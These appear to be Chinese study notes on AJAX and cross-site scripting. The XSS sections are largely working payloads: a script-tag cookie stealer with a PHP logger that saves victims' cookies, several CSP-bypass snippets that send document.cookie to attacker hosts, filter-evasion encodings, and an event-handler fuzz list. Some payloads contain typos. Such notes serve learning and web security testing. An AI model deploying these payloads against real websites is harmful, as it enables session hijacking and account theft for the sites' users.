## 6. XSS & ajax
#XSS #ajax
- AJAX = 异步 JavaScript 和 XML。

- AJAX 是一种用于创建快速动态网页的技术。

- 通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。

创建实例

```javascript
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari 新版浏览器
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5 旧版浏览器
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
```

发送请求

```javascript
xmlhttp.open("GET","test1.txt",true);
xmlhttp.send();
```

| 方法                         | 描述                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| open(*method*,*url*,*async*) | 规定请求的类型、URL 以及是否异步处理请求。  *method*：请求的类型；GET 或 POST *url*：文件在服务器上的位置 *async*：true（异步）或 false（同步） |
| send(*string*)               | 将请求发送到服务器。*string*：仅用于 POST 请求               |

与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。

然而，在以下情况中，请使用 POST 请求：

- 无法使用缓存文件（更新服务器上的文件或数据库）
- 向服务器发送大量数据（POST 没有数据量限制）
- 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠

获得响应

| 属性         | 描述                       |
| ------------ | -------------------------- |
| responseText | 获得字符串形式的响应数据。 |
| responseXML  | 获得 XML 形式的响应数据。  |

```javascript
document.getElementById("myDiv").innerHTML=xmlhttp.responseText;

xmlDoc=xmlhttp.responseXML;
txt="";
x=xmlDoc.getElementsByTagName("ARTIST");
for (i=0;i<x.length;i++)
  {
  txt=txt + x[i].childNodes[0].nodeValue + "<br />";
  }
document.getElementById("myDiv").innerHTML=txt;
```

```xml
<!-- book.xml -->
<bookstore>
<book category="children">
<title lang="en">Harry Potter</title>
<author>J K. Rowling</author>
<year>2005</year>
<price>29.99</price>
</book>
<book category="cooking">
<title lang="en">Everyday Italian</title>
<author>Giada De Laurentiis</author>
<year>2005</year>
<price>30.00</price>
</book>
<book category="web" cover="paperback">
<title lang="en">Learning XML</title>
<author>Erik T. Ray</author>
<year>2003</year>
<price>39.95</price>
</book>
<book category="web">
<title lang="en">XQuery Kick Start</title>
<author>James McGovern</author>
<author>Per Bothner</author>
<author>Kurt Cagle</author>
<author>James Linn</author>
<author>Vaidyanathan Nagarajan</author>
<year>2003</year>
<price>49.99</price>
</book>
</bookstore>
```

onreadyststechange 事件

当请求被发送到服务器时，我们需要执行一些基于响应的任务。

每当 readyState 改变时，就会触发 onreadystatechange 事件。

readyState 属性存有 XMLHttpRequest 的状态信息。

下面是 XMLHttpRequest 对象的三个重要的属性：

| 属性               | 描述                                                         |
| ------------------ | ------------------------------------------------------------ |
| onreadystatechange | 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。 |
| readyState         | 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。  0: 请求未初始化 1: 服务器连接已建立 2: 请求已接收 3: 请求处理中 4: 请求已完成，且响应已就绪 |
| status             | 200: "OK"404: 未找到页面                                     |

```javascript
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;//myDiv是divID
    }
  }
```

==onreadystatechange 事件被触发 5 次（0 - 4），对应着 readyState 的每个变化。==

### 6.1 存储型XSS

把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在

提交js攻击代码 存储到数据库然后输出

```html
<script src="js_url"></script>
```

```javascript
<script>
document.write('<img src="php_url?cookie='+document.cookie+'"width=0 height=0 />');
</script>
```

```php
<?php
$cookie = $_GET['cookie'];
$ip = getenv ('REMOTE_ADDR');
$time = date('Y-m-d g:i:s');
$fp = fopen("cookie.txt","a");
fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
fclose($fp);
?>  
```

### 6.2 反射型XSS

非持久性xss攻击仅对当此页面访问产生影响

包含在url中,诱导用户点击

```url
https://wahh-app.com/error.php?message=<script>alert(''xss''）;</script>
```

### 6.3 dom-XSS

类比SQL注入，不经过服务器直接执行JS代码。

```html
<script> alert(1); </script>
```

### 6.4 X-XSS-Protection

浏览器的安全策略

```php
header("X-XSS-Protection:0");//禁用XSS保护
```

### 6.5 CRLF-XSS

响应头注入
### 6.6 三种主要类型
#### 6.6.1 HTML标签
```html
<input name="user" value="{{your input}}"/>
<!--
payload: " onclick="alert(/xss/)
"><sccript>alert(/xss/)</script>
-->
```
#### 6.6.2 CSS代码
```css
<style type="text/css">
body{
	color:{{your input}};
}
</style>
/*
	payload: #000; background-image:url('javascript:alert(/xss/)')
*/
```
#### 6.6.3 js代码
```javascript
var name='{{your input}}';
//payload:'+alert(/xss/)+'
```
### 6.7 防护与绕过
#### 6.7.1 特定标签过滤
过滤掉部分危险标签script、iframe等并不能防止XSS
```html
<not_real_tag onclick="alert(/xss/)"></not_real_tag>
```
[HTML5 Security Cheatsheet](http://html5sec.org)中提供了大量XSS攻击向量可供参考
#### 6.7.2 事件过滤
可以对所有可利用事件进行遍历测试开发者是否有遗漏，常用事件如下，可以使用burp或自己编写脚本进行Fuzz
```text
onafterprint		oninput				onscroll
onbeforeprint		oninvalid			onabort
onbeforeunload		onreset				oncanplay
onerror				onselect			oncanplaythrough
onhaschange			onsubmit			ondurationchange
onload				onkeydown			onemptied
onmessage			onkeypress			onended
onoffline			onclick				onloadeddata
ononline			ondblclick			onloadedmetadata
onpageshow			ondrag				onloadstart
onpopstate			ondragend			onpause
onredo				ondragenter			onplay
onresize			ondragleave			onplaying
onstorage			ondragover			onprogress
onundo				ondragstart			onratechange
onunload			ondrop				onreadystatechange
onblur				onmousedown			onseeked
onchange			onmousemove			onseeking
oncontextmenu		onmouseout			onstalled
onfocus				onmouseover			onsuspend
onformchange		onmouseup			ontimeupdate
onforminput			onmousewheel		onvolumechange
```
**还有一些常见的标签属性本身并不属于事件属性，但可用于执行JavaScript代码，常见的JavaScript伪协议**
```html
<a href="javascript:alert(/xss/)">click me</a>
```
**HTML5中的某些新属性也可以用于事件过滤绕过**
```html
<details open ontoggle="alert(/xss/)">
<form><button formaction="javascript:slert(/xss/)">X</button>
...
```
#### 6.7.3 敏感关键字过滤
关键字过滤主要针对敏感变量或函数进行，cookie、eval，可以通过字符串拼接、编码解码等方法进行绕过
1. 字符出拼接与混淆
JS中的对象方法可以通过数组的方式进行调用
`window['alert'](/xss/)`=>`window['al'+'ert'](/xss/)`
可以用JS自带的Base64编码解码函数来实现字符串过滤的绕过，btoa将字符串转换为Base64字符串，atob反之
`window[atob("YWxl"+"cnQ=")](/xss/)`
2. 编码解码
- HTML进制编码：十进制（&#97;）、十六进制（$#x61;）
- CSS进制编码：兼容HTML中的进制表现形式，十进制、十六进制（\\61）
- Javascript进制编码：八进制（\\141）、十六进制（\\x61）、Unicode编码（\\u61）、ASCII（String.fromCharCode(97)）
- URL编码：%61
- JSFuck编码：只用\[\]()!+六个字符来编写Javascript程序，某些场景下有奇效
**编码工具[XSSEE](https://evilcos.me/lab/xssee/)中包含大量的编码方式**
3. location.\*、window.name
可以将XSS放置在不被浏览器提交至服务端的部分
location.\*构造如下
`http://example.com/xss.php?input=<input onfocus=outerHTML=decodeURI(location.hash)>#<img src=x onerror=alert(/xss/)>`
window.name构造如下
`<iframe src="http://example.com/xss.php?input=%3Cinput%20onfocus=location=window.name%3E" name="javascript:alert(/xss/)"></iframe>`
利用location对象结合字符串编码可以绕过很多基于关键字的过滤
也有一部分关键字过滤是针对敏感符号的过滤、如括号、空格、小数点等
4. 过滤“.”
JS中使用with关键字设置变量的作用域可以绕过对点号的过滤
`with(document)alert(cookie);`
5. 过滤“()”
JS中可以通过绑定错误处理函数，使用throw关键字传递参数绕过对括号的过滤
`window.onerror=alert; throw 1;`
6. 过滤空格
在标签属性间可以使用换行符0x09、0x10、0x12、0x13、0x0a等字符代替空格绕过过滤
**标签名称和第一个属性间也可以用“/”代替空格**
7. svg标签
svg内部的标签和语句遵循的规则直接继承自xml非html，区别于svg内部的script标签中可以允许存在一部分进制或编码后的字符（比如实体编码）
`http://example.com/xss.php?input=1"><svg><script>alert%26%23x28;1%26%23x29</script></svg>`
#### 6.7.4 字符集编码绕过
1. 古老的UTF-7和US-ASCII
如果输出点在tittle标签之内，meta标签之前，且字符集是由meta标签所指定的，那么仍然可以通过如下方式注入meta标签指定字符集来利用XSS漏洞
基于US-ASCII的也类似
```html
<html>
	<head>
		<title>{{your input}}</title>
		<meta http-equiv="content-type" content="text/html;charset="UTF-8">
	</head>
</html>
<!--
在title中注入
</title><meta charset="utf-7">+ADw-script+AD4-alert(/xss/)+ADw-/script+AD4-:
-->
```
2. 宽字节
通过str_replace和addslashes对输入进行过滤可以使用宽字节进行绕过
`http://example.com/xss.php?input=%d5%22;alert(1);//`
3. 一些特殊字符
特定的byte最后会变成特别的字符
特定的byte会破坏紧随其后的文字
特定的byte会被忽略
可以绕过浏览器的XSS Auditor、制造基于字符编码的XSS漏洞等方面
~~[完整测试结果](http://10.cm/encodings/)~~
#### 6.7.5 长度限制
- window.name
- location.\*
都可以通过将代码放置在别处以减小输入代码量
```html
<iframe src="http://example.com/xss.php?input=%3Cinput%20onfocus=eval(window.name)%3E" name="alert(/xss/)"></iframe>
```
- 第三方库工厂函数
jQuery等第三方JS库提供相应的工厂函数，jQ中的\$()会自动构造标签并执行其中代码
```html
<iframe src="http://example.com/xss.php?input=%3Cinput%20onfocus=$(window.name)%3E" name="<img src='x' onerror=alert(/xss/)/>"/>
```
- 注释
```text
stage 1: <script>/*
stage 2: */slert/*
stage 3: */</script>
```
#### 6.7.6 HttpOnly绕过
HttpOnly是cookie的一个安全属性，设置后可在XSS漏洞发生时避免JS读到cookie，即使设置了该属性，仍有办法读到cookie
1. CVE-2012-0053
Apache2.2.0-2.2.21攻击者可通过向网站植入超大的cookie，令其头超过Apache的LimitRequestFieldSize（最大请求长度，4192字节）,使得Apache返回400错误，状态页中包含保护的cookie
[源代码](https://www.exploit-db.com/exploits/18442)
除Apache，其他的Web服务器在使用者不了解其特性的情况下页很容易出现HttpOnly保护的cookie被爆出的情况，如Squid等
2. PHPINFO
phpinfo()函数会输出当前请求上下文的cookie信息
3. Flash/Java
客户端信息泄露Flash/Java API[地址](http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html)
#### 6.7.7 XSS Auditor绕过
- 字符集编码绕过
低版本的chrome对ISO-2022-JP等编码处理不当，当页面没有设置默认编码并使用这个日语字符集时，XSS Auditor检查的部分会像Payload添加0x0f字符，达到绕过目的
```html
<meta charset="ISO-2022-JP"><img sec="#" onerror%1B28B=alert(1)/>
```
- 协议理解问题
如果加载的脚本在自身目录下，并且XSS的输出点在HTML属性中，XSS Auditor不会进行拦截，如果检测到//这样的外部链接则会触发导致无法加载脚本
`http://example.com/xss.php?input=1"><link%20rel="import"%20href=https:evil.com/1.php`
- CRLF绕过
如果在HTTP响应头中注入CRLF并在新一行中写入X-XSS-Protection:0，接下来的XSS代码将不会被拦截
#### 6.7.8 [内容安全策略（CSP）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)绕过
CSP可以防止攻击者从外部网站跨域加载恶意代码，但不能防止数据泄露
1. CSP配置错误
	-  策略定义不全或未使用default-src来补全
	- script-src的源列表包含unsafe-inline（并且没有使用nonce或hash策略）或允许data伪协议
	- script-src或object-src源列表包含攻击者可控制的部分源地址（文件上传、JSON Hijacking、SOME攻击），或者包含不安全的库
	- 源地址列表滥用通配符
	- ...
其中第二种可以直接使用事件属性或script标签执行代码
2. [[../protocol/HTTP/CSP#unsafe-inline|unsafe-inline]]绕过
除script开启unsafe-inline模式之外，其余资源仅允许加载同域，可用绕过方式如下：
	- DNS Prefetch 由于link标签最新的rel属性dns-prefetch尚未被加入CSP实现中，使用如下payload即可发送一条DNS解析请求，在NS服务器下查看解析日志便可得到如下内容：`<link rel="dns-prefetch" href="[cookie].evil.com">`
	- location.href 大部分网站跳转还是依赖前端来进行，在CSP中无法对location进行限制，由此衍生出大量绕过方式
```html
<!--bypass1-->
<script>location='http://eval.com/cookie.php?cookie='+escape(document.cookie);</script>
<!--bypass2-->
<script>
	var a = document.createElement("a");
	a.href='http://eval.com/cookie.php?cookie='+escape(document.cookie);
	document.body.appendChild(a);
	a.click();
</script>
<!--bypass3-->
<meta http-equiv="refresh" content="1;url=http://eval.com/cookie.php?data=[cookie]">
```
3. 严苛规则[[../protocol/HTTP/CSP#script-src 'self'|script-src 'self']]下的绕过
关闭unsafe-inline模式，所有资源仅允许同源加载。此时可以重定向（302）导致绕过，如果将script-src设置为某个目录，通过该目录下的302跳转是可以绕过CSP取到记载其他目录的资源的
payload:`http://example.com/xss.php?input=<script src="http://example.com/a/redirect.php?url=http://example.com/b/evil.js"></script>`
4. CSRF绕过
在HTTP响应头中注入\[CSRF\]\[CSRF\]，将CSP头部分割至HTTP响应体中，这样注入的XSS代码就不受影响了
### 6.8 危害与利用技巧
- 盗取用户Cookie信息，伪造用户身份
- 与浏览器DOM对象进行交互，执行受害者所有可以执行的操作
- 获取网页源码
- 发起HTTP请求
- 使用HTML5 Geolocation API获取地理位置信息
- 使用WebRTC API获取信息
- 发起HTTP请求对内网主机进行扫描，对存在漏洞的主机进行攻击
- ...

XSS漏洞利用平台：[BeEF（The Browser Exploitation Framework）](https://github.com/beefproject/beef/)包含大量可用的XSS代码